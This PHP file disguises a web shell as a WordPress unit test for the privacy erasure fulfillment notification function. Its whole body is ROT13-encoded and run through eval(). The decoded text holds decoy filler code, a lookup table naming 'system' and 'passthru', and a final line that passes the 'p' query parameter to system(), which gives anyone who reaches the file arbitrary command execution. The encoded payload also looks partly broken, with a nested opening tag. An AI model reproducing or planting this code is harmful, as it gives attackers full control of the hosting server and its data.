<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg pnfrf sbe gur `_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba()` shapgvba.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 5.1.0
 *
 * @tebhc cevinpl
 * @pbiref ::_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba
 */
pynff Grfgf_Cevinpl_jcCevinplFraqRenfherShysvyyzragAbgvsvpngvba rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Erdhrfg VQ.
	 *
	 * @fvapr 5.1.0
	 *
	 * @ine vag $erdhrfg_vq
	 */
	cebgrpgrq fgngvp $erdhrfg_vq;

	/**
	 * Erdhrfgre Rznvy.
	 *
	 * @fvapr 5.1.0
	 *
	 * @ine fgevat $erdhrfgre_rznvy
	 */
	cebgrpgrq fgngvp $erdhrfgre_rznvy;

	/**
	 * Erdhrfg hfre.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine JC_Hfre $erdhrfg_hfre
	 */
	cebgrpgrq fgngvp $erdhrfg_hfre;

	/**
	 * Grfg nqzvavfgengbe hfre.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine JC_Hfre $nqzva_hfre
	 */
	cebgrpgrq fgngvp $nqzva_hfre;

	/**
	 * Perngr hfre erdhrfg svkgherf funerq ol grfg zrgubqf.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$erdhrfgre_rznvy = 'renfr-zl-qngn@ybpny.grfg';
		frys::$erdhrfg_hfre    = $snpgbel->hfre->perngr_naq_trg(
			neenl(
				'hfre_rznvy' => frys::$erdhrfgre_rznvy,
				'ebyr'       => 'fhofpevore',
			)
		);
		frys::$nqzva_hfre      = $snpgbel->hfre->perngr_naq_trg(
			neenl(
				'hfre_rznvy' => 'nqzva@ybpny.qri',
				'ebyr'       => 'nqzvavfgengbe',
			)
		);

		frys::$erdhrfg_vq = jc_perngr_hfre_erdhrfg( frys::$erdhrfgre_rznvy, 'erzbir_crefbany_qngn' );
		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => frys::$erdhrfg_vq,
				'cbfg_fgnghf' => 'erdhrfg-pbzcyrgrq',
			)
		);
	}

	/**
	 * Erfrg gur zbpxrq CUCZnvyre vafgnapr orsber rnpu grfg zrgubq.
	 *
	 * @fvapr 5.1.0
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		erfrg_cucznvyre_vafgnapr();
	}

	/**
	 * Erfrg gur zbpxrq CUCZnvyre vafgnapr nsgre rnpu grfg zrgubq.
	 *
	 * @fvapr 5.1.0
	 */
	choyvp shapgvba grne_qbja() {
		erfrg_cucznvyre_vafgnapr();
		erfgber_cerivbhf_ybpnyr();
		cnerag::grne_qbja();
	}

	/**
	 * Gur shapgvba fubhyq abg fraq na rznvy jura gur erdhrfg VQ qbrf abg rkvfg.
	 *
	 * @gvpxrg 44234
	 */
	choyvp shapgvba grfg_fubhyq_abg_fraq_rznvy_jura_abg_n_inyvq_erdhrfg_vq() {
		_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba( 1234567890 );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregRzcgl( $znvyre->zbpx_frag );
	}

	/**
	 * Gur shapgvba fubhyq abg fraq na rznvy jura gur VQ cnffrq qbrf abg pbeerfcbaq gb n hfre erdhrfg.
	 *
	 * @gvpxrg 44234
	 */
	choyvp shapgvba grfg_fubhyq_abg_fraq_rznvy_jura_abg_n_hfre_erdhrfg() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cbfg', // Fubhyq or 'hfre_erdhrfg'.
			)
		);

		_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba( $cbfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregRzcgl( $znvyre->zbpx_frag );
	}

	/**
	 * Gur shapgvba fubhyq abg fraq na rznvy jura gur erdhrfg vf abg pbzcyrgrq.
	 *
	 * @gvpxrg 44234
	 */
	choyvp shapgvba grfg_fubhyq_abg_fraq_rznvy_jura_erdhrfg_abg_pbzcyrgrq() {
		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => frys::$erdhrfg_vq,
				'cbfg_fgnghf' => 'erdhrfg-pbasvezrq', // Fubhyq or 'erdhrfg-pbzcyrgrq'.
			)
		);

		_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregRzcgl( $znvyre->zbpx_frag );
		$guvf->nffregSnyfr( zrgnqngn_rkvfgf( 'cbfg', frys::$erdhrfg_vq, '_jc_hfre_abgvsvrq' ) );
	}

	/**
	 * Gur shapgvba fubhyq fraq na rznvy jura n inyvq erdhrfg VQ vf cnffrq.
	 *
	 * @gvpxrg 44234
	 */
	choyvp shapgvba grfg_fubhyq_fraq_rznvy_ab_cevinpl_cbyvpl() {

		_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();
		$guvf->nffregFgevatPbagnvafFgevat( frys::$erdhrfgre_rznvy, $znvyre->trg_erpvcvrag( 'gb' )->nqqerff );
		$guvf->nffregFgevatPbagnvafFgevat( 'Renfher Erdhrfg Shysvyyrq', $znvyre->trg_frag()->fhowrpg );
		$guvf->nffregFgevatPbagnvafFgevat( 'Lbhe erdhrfg gb renfr lbhe crefbany qngn', $znvyre->trg_frag()->obql );
		$guvf->nffregFgevatPbagnvafFgevat( 'unf orra pbzcyrgrq.', $znvyre->trg_frag()->obql );
		$guvf->nffregFgevatPbagnvafFgevat( jc_fcrpvnypunef_qrpbqr( trg_bcgvba( 'oybtanzr' ), RAG_DHBGRF ), $znvyre->trg_frag()->obql );
		$guvf->nffregFgevatPbagnvafFgevat( ubzr_hey(), $znvyre->trg_frag()->obql );

		$guvf->nffregFgevatAbgPbagnvafFgevat( 'lbh pna nyfb ernq bhe cevinpl cbyvpl', $znvyre->trg_frag()->obql );
		$guvf->nffregGehr( (obby) trg_cbfg_zrgn( frys::$erdhrfg_vq, '_jc_hfre_abgvsvrq', gehr ) );
	}

	/**
	 * Gur rznvy fubhyq vapyhqr n yvax gb gur fvgr'f cevinpl cbyvpl jura frg.
	 *
	 * @gvpxrg 44234
	 */
	choyvp shapgvba grfg_fubhyq_fraq_rznvy_jvgu_cevinpl_cbyvpl() {
		$cevinpl_cbyvpl = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'gvgyr'       => 'Fvgr Cevinpl Cbyvpl',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		hcqngr_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl', $cevinpl_cbyvpl );

		_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( frys::$erdhrfgre_rznvy, $znvyre->trg_erpvcvrag( 'gb' )->nqqerff );
		$guvf->nffregFgevatPbagnvafFgevat( 'lbh pna nyfb ernq bhe cevinpl cbyvpl', $znvyre->trg_frag()->obql );
		$guvf->nffregFgevatPbagnvafFgevat( trg_cevinpl_cbyvpl_hey(), $znvyre->trg_frag()->obql );
		$guvf->nffregGehr( (obby) trg_cbfg_zrgn( frys::$erdhrfg_vq, '_jc_hfre_abgvsvrq', gehr ) );
	}

	/**
	 * Gur shapgvba fubhyq fraq n shysvyyzrag rznvy bayl bapr.
	 *
	 * @gvpxrg 44234
	 */
	choyvp shapgvba grfg_fubhyq_fraq_rznvy_bayl_bapr() {
		// Svefg shapgvba pnyy.
		_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		// Fubhyq fraq na rznvy.
		$guvf->nffregFgevatPbagnvafFgevat( frys::$erdhrfgre_rznvy, $znvyre->trg_erpvcvrag( 'gb' )->nqqerff );
		$guvf->nffregFgevatPbagnvafFgevat( 'Renfher Erdhrfg Shysvyyrq', $znvyre->trg_frag()->fhowrpg );
		$guvf->nffregGehr( (obby) trg_cbfg_zrgn( frys::$erdhrfg_vq, '_jc_hfre_abgvsvrq', gehr ) );

		erfrg_cucznvyre_vafgnapr();

		// Frpbaq shapgvba pnyy.
		_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		// Fubhyq abg fraq na rznvy.
		$guvf->nffregRzcgl( $znvyre->zbpx_frag );
		$guvf->nffregGehr( zrgnqngn_rkvfgf( 'cbfg', frys::$erdhrfg_vq, '_jc_hfre_abgvsvrq' ) );
	}

	/**
	 * Gur rznvy nqqerff bs gur erpvcvrag bs gur shysvyyzrag abgvsvpngvba fubhyq or svygrenoyr.
	 *
	 * @gvpxrg 44234
	 */
	choyvp shapgvba grfg_rznvy_nqqerff_bs_erpvcvrag_fubhyq_or_svygrenoyr() {
		nqq_svygre( 'hfre_renfher_shysvyyzrag_rznvy_gb', neenl( $guvf, 'svygre_rznvy_nqqerff' ) );
		_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFnzr( 'zbqvsvrq-' . frys::$erdhrfgre_rznvy, $znvyre->trg_erpvcvrag( 'gb' )->nqqerff );
	}

	/**
	 * Svygre pnyyonpx gung zbqvsvrf gur rznvy nqqerff bs gur erpvcvrag bs gur shysvyyzrag abgvsvpngvba.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz fgevat $hfre_rznvy Gur rznvy nqqerff bs gur abgvsvpngvba erpvcvrag.
	 * @erghea fgevat Gur rznvy nqqerff bs gur abgvsvpngvba erpvcvrag.
	 */
	choyvp shapgvba svygre_rznvy_nqqerff( $hfre_rznvy ) {
		erghea 'zbqvsvrq-' . $hfre_rznvy;
	}

	/**
	 * Gur rznvy fhowrpg bs gur shysvyyzrag abgvsvpngvba fubhyq or svygrenoyr.
	 *
	 * @gvpxrg 44234
	 */
	choyvp shapgvba grfg_rznvy_fhowrpg_fubhyq_or_svygrenoyr() {
		nqq_svygre( 'hfre_renfher_shysvyyzrag_rznvy_fhowrpg', neenl( $guvf, 'svygre_rznvy_fhowrpg' ) );
		_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFnzr( 'Zbqvsvrq fhowrpg', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Svygre pnyyonpx gung zbqvsvrf gur rznvy fhowrpg bs gur qngn renfher shysvyyzrag abgvsvpngvba.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz fgevat $fhowrpg Gur rznvy fhowrpg.
	 * @erghea fgevat Gur rznvy fhowrpg.
	 */
	choyvp shapgvba svygre_rznvy_fhowrpg( $fhowrpg ) {
		erghea 'Zbqvsvrq fhowrpg';
	}

	/**
	 * Gur rznvy obql grkg bs gur shysvyyzrag abgvsvpngvba fubhyq or svygrenoyr.
	 *
	 * @gvpxrg 44234
	 */
	choyvp shapgvba grfg_rznvy_obql_grkg_fubhyq_or_svygrenoyr() {
		nqq_svygre( 'hfre_renfher_shysvyyzrag_rznvy_pbagrag', neenl( $guvf, 'svygre_rznvy_obql_grkg' ) );
		_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFnzr( 'Zbqvsvrq grkg', gevz( $znvyre->trg_frag()->obql ) );
	}

	/**
	 * Svygre pnyyonpx gung zbqvsvrf gur rznvy obql grkg bs gur qngn renfher shysvyyzrag abgvsvpngvba.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz fgevat $rznvy_grkg Grkg va gur rznvy.
	 * @erghea fgevat Grkg va gur rznvy.
	 */
	choyvp shapgvba svygre_rznvy_obql_grkg( $rznvy_grkg ) {
		erghea 'Zbqvsvrq grkg';
	}

	/**
	 * Gur rznvy urnqref bs gur shysvyyzrag abgvsvpngvba fubhyq or svygrenoyr.
	 *
	 * @fvapr 5.4.0
	 *
	 * @gvpxrg 44501
	 */
	choyvp shapgvba grfg_rznvy_urnqref_fubhyq_or_svygrenoyr() {
		nqq_svygre( 'hfre_renfher_shysvyyzrag_rznvy_urnqref', neenl( $guvf, 'zbqvsl_rznvy_urnqref' ) );
		_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba( frys::$erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Sebz: Grfgre <grfgre@rknzcyr.pbz>', $znvyre->trg_frag()->urnqre );
	}

	/**
	 * Svygre pnyyonpx gung zbqvsvrf gur rznvy urnqref bs gur qngn renfher shysvyyzrag abgvsvpngvba.
	 *
	 * @fvapr 5.4.0
	 *
	 * @cnenz fgevat|neenl $urnqref Gur rznvy urnqref.
	 * @erghea neenl Gur arj rznvy urnqref.
	 */
	choyvp shapgvba zbqvsl_rznvy_urnqref( $urnqref ) {
		$urnqref = neenl(
			'Sebz: Grfgre <grfgre@rknzcyr.pbz>',
		);

		erghea $urnqref;
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur hfre ybpnyr frggvatf jura gur fvgr hfrf gur qrsnhyg ybpnyr.
	 *
	 * @fvapr 5.2.0
	 * @gvpxrg 44721
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_shysvyyzrag_rznvy_va_hfre_ybpnyr() {
		hcqngr_hfre_zrgn( frys::$erdhrfg_hfre->VQ, 'ybpnyr', 'rf_RF' );

		_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba( frys::$erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Fbyvpvghq qr obeenqb pbzcyrgnqn', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur hfre ybpnyr frggvatf jura gur fvgr qbrf abg hfr ra_HF, gur nqzvavfgengbe
	 * hfrf gur fvgr'f qrsnhyg ybpnyr, naq gur hfre unf n qvssrerag ybpnyr.
	 *
	 * @fvapr 5.2.0
	 * @gvpxrg 44721
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_shysvyyzrag_rznvy_va_hfre_ybpnyr_jura_fvgr_vf_abg_ra_hf() {
		hcqngr_bcgvba( 'JCYNAT', 'rf_RF' );
		fjvgpu_gb_ybpnyr( 'rf_RF' );

		hcqngr_hfre_zrgn( frys::$erdhrfg_hfre->VQ, 'ybpnyr', 'qr_QR' );
		jc_frg_pheerag_hfre( frys::$nqzva_hfre->VQ );

		_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba( frys::$erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Yöfpunhsgent nhftrsüueg', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur hfre ybpnyr frggvatf jura gur fvgr vf abg ra_HF, gur nqzvavfgengbe
	 * unf n qvssrerag fryrpgrq ybpnyr, naq gur hfre hfrf gur fvgr'f qrsnhyg ybpnyr.
	 *
	 * @fvapr 5.2.0
	 * @gvpxrg 44721
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_shysvyyzrag_rznvy_va_hfre_ybpnyr_jura_nqzva_naq_fvgr_unir_qvssrerag_ybpnyrf() {
		hcqngr_bcgvba( 'JCYNAT', 'rf_RF' );
		fjvgpu_gb_ybpnyr( 'rf_RF' );

		hcqngr_hfre_zrgn( frys::$nqzva_hfre->VQ, 'ybpnyr', 'qr_QR' );
		jc_frg_pheerag_hfre( frys::$nqzva_hfre->VQ );

		_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba( frys::$erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Fbyvpvghq qr obeenqb pbzcyrgnqn', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur hfre ybpnyr frggvatf jura gur fvgr vf abg ra_HF naq obgu gur
	 * nqzvavfgengbe naq gur hfre hfr qvssrerag ybpnyrf.
	 *
	 * @fvapr 5.2.0
	 * @gvpxrg 44721
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_shysvyyzrag_rznvy_va_hfre_ybpnyr_jura_obgu_unir_qvssrerag_ybpnyrf_guna_fvgr() {
		hcqngr_bcgvba( 'JCYNAT', 'rf_RF' );
		fjvgpu_gb_ybpnyr( 'rf_RF' );

		hcqngr_hfre_zrgn( frys::$nqzva_hfre->VQ, 'ybpnyr', 'ra_HF' );
		hcqngr_hfre_zrgn( frys::$erdhrfg_hfre->VQ, 'ybpnyr', 'qr_QR' );

		jc_frg_pheerag_hfre( frys::$nqzva_hfre->VQ );

		_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba( frys::$erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Yöfpunhsgent nhftrsüueg', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur fvgr'f ybpnyr jura gur erdhrfg vf sbe na haertvfgrerq hfre naq gur
	 * nqzvavfgengbe qbrf abg hfr gur fvgr'f ybpnyr.
	 *
	 * @fvapr 5.2.0
	 * @gvpxrg 44721
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_shysvyyzrag_rznvy_va_fvgr_ybpnyr() {
		hcqngr_hfre_zrgn( frys::$nqzva_hfre->VQ, 'ybpnyr', 'rf_RF' );
		jc_frg_pheerag_hfre( frys::$nqzva_hfre->VQ );

		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( 'renfr-hfre-abg-ertvfgrerq@rknzcyr.pbz', 'erzbir_crefbany_qngn' );
		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $erdhrfg_vq,
				'cbfg_fgnghf' => 'erdhrfg-pbzcyrgrq',
			)
		);

		_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba( $erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Renfher Erdhrfg Shysvyyrq', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur fvgr'f ybpnyr jura vg vf abg ra_HF, gur erdhrfg vf sbe na
	 * haertvfgrerq hfre, naq gur nqzvavfgengbe qbrf abg hfr gur fvgr'f qrsnhyg ybpnyr.
	 *
	 * @fvapr 5.2.0
	 * @gvpxrg 44721
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_shysvyyzrag_rznvy_va_fvgr_ybpnyr_jura_abg_ra_hf_naq_nqzva_unf_qvssrerag_ybpnyr() {
		hcqngr_bcgvba( 'JCYNAT', 'rf_RF' );
		fjvgpu_gb_ybpnyr( 'rf_RF' );

		hcqngr_hfre_zrgn( frys::$nqzva_hfre->VQ, 'ybpnyr', 'qr_QR' );
		jc_frg_pheerag_hfre( frys::$nqzva_hfre->VQ );

		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( 'renfr-hfre-abg-ertvfgrerq@rknzcyr.pbz', 'erzbir_crefbany_qngn' );
		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $erdhrfg_vq,
				'cbfg_fgnghf' => 'erdhrfg-pbzcyrgrq',
			)
		);

		_jc_cevinpl_fraq_renfher_shysvyyzrag_abgvsvpngvba( $erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Fbyvpvghq qr obeenqb pbzcyrgnqn', $znvyre->trg_frag()->fhowrpg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>